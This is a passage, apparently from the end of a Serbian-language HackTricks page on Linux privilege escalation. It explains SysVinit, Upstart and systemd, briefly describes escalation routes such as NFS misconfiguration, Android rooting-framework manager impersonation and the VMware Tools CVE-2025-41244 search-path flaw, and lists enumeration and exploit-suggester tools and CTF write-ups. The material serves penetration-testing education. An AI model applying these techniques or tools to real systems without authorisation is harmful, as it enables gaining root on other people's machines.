(_Imajte na umu razmak između Network i /bin/id_)

### **init, init.d, systemd, i rc.d**

Direktorijum `/etc/init.d` sadrži **skripte** za System V init (SysVinit), **klasični Linux sistem za upravljanje servisima**. Uključuje skripte za `start`, `stop`, `restart` i ponekad `reload` servisa. One se mogu izvršavati direktno ili putem simboličkih linkova koji se nalaze u `/etc/rc?.d/`. Alternativna putanja na Redhat sistemima je `/etc/rc.d/init.d`.

S druge strane, `/etc/init` je povezan sa **Upstart** sistemom, novijim **sistemom za upravljanje servisima** koji je uveo Ubuntu i koji koristi konfiguracione fajlove za zadatke upravljanja servisima. Uprkos prelasku na Upstart, SysVinit skripte se i dalje koriste zajedno sa Upstart konfiguracijama zbog compatibility layer-a u Upstart-u.

**systemd** se pojavljuje kao moderan initialization i service manager, koji nudi napredne funkcije kao što su pokretanje daemon-a na zahtev, upravljanje automount-om i snapshots stanja sistema. Organizuje fajlove u `/usr/lib/systemd/` za distribution packages i `/etc/systemd/system/` za izmene administratora, čime pojednostavljuje proces administracije sistema.

## Other Tricks

### NFS Privilege escalation


{{#ref}}
../../interesting-files-permissions/nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
../../main-system-information/escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
../../network-information/cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks obično hook-uju syscall kako bi userspace manager-u izložili privilegovanu kernel funkcionalnost. Slaba autentikacija manager-a (npr. signature provere zasnovane na FD-order-u ili loše password scheme) može omogućiti lokalnoj aplikaciji da se lažno predstavi kao manager i eskalira na root na uređajima koji su već rootovani. Više informacija i detalje exploitation-a pronađite ovde:


{{#ref}}
../../software-information/android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

Regex-driven service discovery u VMware Tools/Aria Operations može da izdvoji binary path iz command line-ova procesa i izvrši ga sa -v u privilegovanom context-u. Permissive patterns (npr. korišćenje \S) mogu da podudare attacker-staged listeners na writable locations (npr. /tmp/httpd), što dovodi do izvršavanja kao root (CWE-426 Untrusted Search Path).

Više informacija i generalizovani pattern primenljiv na druge discovery/monitoring stacks pronađite ovde:

{{#ref}}
../../main-system-information/kernel-lpe-cves/vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Najbolji tool za pronalaženje Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns u Linux-u i MAC-u [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [0xdf – HTB Era: forged .text_sig payload for cron-executed monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [0xdf – Holiday Hack Challenge 2025: Neighborhood Watch Bypass (sudo env_keep PATH hijack)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [0xdf – HTB Previous (sudo terraform dev_overrides + TF_VAR symlink privesc)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [0xdf – HTB Slonik (pg_basebackup cron copy → SUID bash)](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)
- [0xdf – HTB: Expressway](https://0xdf.gitlab.io/2026/03/07/htb-expressway.html)
- [0xdf – HTB: Browsed](https://0xdf.gitlab.io/2026/03/28/htb-browsed.html)
- [PEP 3147 – PYC Repository Directories](https://peps.python.org/pep-3147/)
- [Python importlib docs](https://docs.python.org/3/library/importlib.html)

{{#include ../../../banners/hacktricks-training.md}}
